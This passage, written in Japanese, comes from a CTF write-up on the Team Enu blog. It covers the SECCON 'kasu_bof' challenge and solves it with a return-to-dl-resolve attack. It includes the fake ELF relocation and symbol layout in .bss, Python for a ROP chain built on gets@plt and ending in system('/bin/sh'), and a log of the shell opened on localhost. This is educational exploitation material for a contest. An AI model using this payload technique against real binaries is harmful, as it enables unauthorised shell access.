| Elf32_Rel | r_offset                  | 8 byte  |
|           | r_info                    |         |
|-----------+---------------------------+---------|
|           |                           | 8 byte  |
|           |                           | (align) |
|-----------+---------------------------+---------|
| Elf32_Sym | st_name                   | 16 byte |
|           | st_value                  |         |
|           | st_size                   |         |
|           | st_info st_other st_shndx |         |
|-----------+---------------------------+---------|
|           |                           | 4 byte  |
|-----------+---------------------------+---------|
| symbol    | 'system'                  | 4 byte  |
|-----------+---------------------------+---------|
|           |                           | 4 byte  |
|-----------+---------------------------+---------|
| argment   | '/bin/sh'                 |  4byte  |
|-----------+---------------------------+---------|
|           |                           |         |
</pre>
<p>
このとき、 <code>Elf32_Sym</code> 構造体は、 <code>dynsym</code> セクションのアドレスから、 <code>0x10</code> byteの間隔で配置されなければならないため( <code>Elf32_Sym</code> 構造体のサイズが <code>0x10</code> byteのため)、
    必要なbyte数だけalignしている。
</p>
<p>
    Solverを書くときは、事前に <code>.bss</code> のどのアドレスがどの構造体やシンボルに対応するか計算しておき、ROPで <code>gets</code> の引数として指定しておき、ROPチェインが発火後に、それぞれの構造体やシンボルを書き込んでいく。
</p>
<div class="src src-python">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">  Elf32_Rel_addr <span style="color:#f92672">=</span> bss

  Elf32_Sym_addr <span style="color:#f92672">=</span> Elf32_Rel_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>

  system_symbol_addr <span style="color:#f92672">=</span> Elf32_Sym_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>

  sh_symbol_addr <span style="color:#f92672">=</span> system_symbol_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c</span></code></pre></div>
</div>
<h5 id="headline-18">
ROPチェインの作成
</h5>
<p>
あとは、用意した偽の構造体やシンボルを <code>.bss</code> 領域内に格納できるように、複数回 <code>gets</code> を呼び出す必要がある。
</p>
<p>
     そこで、 それぞれ計算しておいた領域に構造体を引数とし、 <code>gets@plt</code> にジャンプするROPを組む。
     x86のROPは、参考のセキュリティコンテストチャレンジブックが参考になる。
</p>
<div class="src src-python">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"> <span style="color:#75715e"># padding</span>
 buf <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x84</span>                 <span style="color:#75715e"># fill stack</span>
 buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeaf</span>)         <span style="color:#75715e"># saved_ebp</span>

 <span style="color:#75715e"># gets(Elf32_Rel_addr)</span>
 buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># main return addr</span>
 buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return addr</span>
 buf <span style="color:#f92672">+=</span> p32(Elf32_Rel_addr)     <span style="color:#75715e"># gets arg</span>

 <span style="color:#75715e"># gets(Elf32_Sym_addr)</span>
 buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># pop ret return addr</span>
 buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return addr</span>
 buf <span style="color:#f92672">+=</span> p32(Elf32_Sym_addr)     <span style="color:#75715e"># gets arg</span>

 <span style="color:#75715e"># gets(system_symbol_addr)</span>
 buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># pop ret return addr</span>
 buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return addr</span>
 buf <span style="color:#f92672">+=</span> p32(system_symbol_addr) <span style="color:#75715e"># gets arg</span>

 <span style="color:#75715e"># gets(sh_symbol_addr)</span>
 buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># pop ret return addr</span>
 buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return  addr</span>
 buf <span style="color:#f92672">+=</span> p32(sh_symbol_addr)     <span style="color:#75715e"># gets arg</span></code></pre></div>
</div>
<p>
     それぞれの構造体とシンボルの書き込みを行うROPを組んだ後、偽の構造体を元にアドレスを解決させるため、 <code>.plt</code> セクションの先頭にジャンプする。
     このとき、 <code>system</code> の引数として <code>/bin/sh</code> を取れるように、 <code>/bin/sh</code> が格納されたアドレスをスタックに積んでおく。
</p>
<div class="src src-python">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"> <span style="color:#75715e"># system(&#39;/bin/sh&#39;)</span>
 buf <span style="color:#f92672">+=</span> p32(plt)                <span style="color:#75715e"># pop ret return addr</span>
 buf <span style="color:#f92672">+=</span> p32(reloc_arg)          <span style="color:#75715e"># reloc arg</span>
 buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>)         <span style="color:#75715e"># padding</span>
 buf <span style="color:#f92672">+=</span> p32(sh_symbol_addr)     <span style="color:#75715e"># system arg</span></code></pre></div>
</div>
<h4 id="headline-19">
Solver
</h4>
<p>
<a href="https://github.com/Team-Enu/writeup/tree/main/seccon-ctf-2022/kasu_bof">https://github.com/Team-Enu/writeup/tree/main/seccon-ctf-2022/kasu_bof</a>
</p>
<h5 id="headline-20">
実行結果
</h5>
<pre class="example">
mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ python solve.py 
[*] '/home/mc4nf/ctf/seccon2021/pwn/kasu_bof/chall'
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
[+] Opening connection to localhost on port 9001: Done
[*] Switching to interactive mode
$ ls
chall
flag-4f8e964cf95b989f6def1afdfd0e91b7.txt
$ cat flag*
SECCON{jUst_4_s1mpL3_b0f_ch4ll3ng3}
</pre>
<h5 id="headline-21">
<code>SECCON{jUst_4_s1mpL3_b0f_ch4ll3ng3}</code>
</h5>
<h3 id="headline-22">
参考
</h3>
<ul>
<li>
<p>
詳解セキュリティコンテスト
</p>
<ul>
<li>
<p>
<a href="https://book.mynavi.jp/ec/products/detail/id=122750">https://book.mynavi.jp/ec/products/detail/id=122750</a>
</p>
</li>
<li>
<p>
33.2.2 発展：関数シンボルの動的解決 p.525
</p>
</li>
</ul>
</li>
<li>
<p>
ROP stager + Return-to-dl-resolveによるASLR+DEP回避 - ももいろテクノロジー   
</p>
<ul>
<li>
<p>
<a href="https://inaz2.hatenablog.com/entry/2014/07/15/023406">https://inaz2.hatenablog.com/entry/2014/07/15/023406</a>
</p>
</li>
</ul>
</li>
<li>
<p>
ret2dl resolve - slideshare
</p>
<ul>
<li>
<p>
<a href="https://www.slideshare.net/sounakano/ret2dl-resolve">https://www.slideshare.net/sounakano/ret2dl-resolve</a>
</p>
</li>
</ul>
</li>
<li>
<p>
セキュリティコンテストチャレンジブック
</p>
<ul>
<li>
<p>
<a href="https://book.mynavi.jp/ec/products/detail/id=42421">https://book.mynavi.jp/ec/products/detail/id=42421</a>
</p>
</li>
<li>
<p>
2.4 エクスプロイト - Retrun to PLT (ret2plt) p.109
</p>
<ul>
<li>
<p>
x86のROP
</p>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>
リンカ・ローダ実践開発テクニック
</p>
<ul>
<li>
<p>
<a href="https://shop.cqpub.co.jp/hanbai/books/38/38071.html">https://shop.cqpub.co.jp/hanbai/books/38/38071.html</a>
</p>
</li>
<li>
<p>
2.9 シンボル・テーブル p.54
</p>
<ul>
<li>
<p>
Elf_Sym構造体について    
</p>
</li>
</ul>
</li>
<li>
<p>
2.10 再配置テーブル p.57
</p>
<ul>
<li>
<p>
Elf_Rel構造体について
</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li>
<p>
ret2dl_resolve Sections 關係表
</p>
<ul>
<li>
<p>
<a href="https://hackmd.io/@LJP/BkJmAqXEI">https://hackmd.io/@LJP/BkJmAqXEI</a>
</p>
</li>
<li>
<p>
ELfのマクロについて
</p>
</li>
</ul>
</li>
</ul>
<p>
created 2022/11/11<br>
updated 2022/12/21
</p>

    </div>
    <footer class="content__footer"></footer>

            </section>

            <section class="page__aside">
                <div class="aside__about">
<div class="aside__about">
    <img class="about__logo" src="http://localhost:8080/team-enu.png" alt="Logo">
<h1 class="about__title">Team Enu</h1>
<p class="about__description">Team EnuのWriteupや活動の紹介を掲載しています。</p>
</div>


<ul class="aside__social-links">
    
</ul>
</div>
                <hr>
                <div class="aside__content">
    
    
        <p>
            By mc4nf, 
            2022-11-11
        </p>
    

                </div>
            </section>

            <footer class="page__footer"><p>
    
    
    
    
    
    
      
    
      
    
    
    
</p>
<br /><br />
<p class="copyright"></p>
<p class="advertisement">Powered by <a href="https://gohugo.io/">hugo</a> and <a href="https://github.com/joeroe/risotto">risotto</a>.</p>
</footer>

        </div>
    </body>

</html>
